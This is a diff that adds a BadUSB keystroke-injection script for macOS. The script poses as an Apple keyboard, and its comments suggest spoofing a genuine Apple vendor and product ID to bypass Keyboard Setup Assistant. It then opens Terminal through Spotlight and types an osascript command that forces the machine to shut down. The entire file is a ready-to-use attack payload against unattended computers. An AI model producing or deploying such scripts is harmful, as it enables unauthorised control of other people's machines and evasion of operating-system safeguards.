@@ -1,0 +1,18 @@
+ID 1234:5678 Apple:Keyboard
+REM You can change these values to VID/PID of original Apple keyboard
+REM to bypass Keyboard Setup Assistant
+
+REM This is BadUSB script for macOS
+
+REM Open terminal window
+DELAY 1000
+GUI SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 750
+
+REM Run the shutdown command directly
+STRING osascript -e 'tell app "System Events" to shut down'
+ENTER
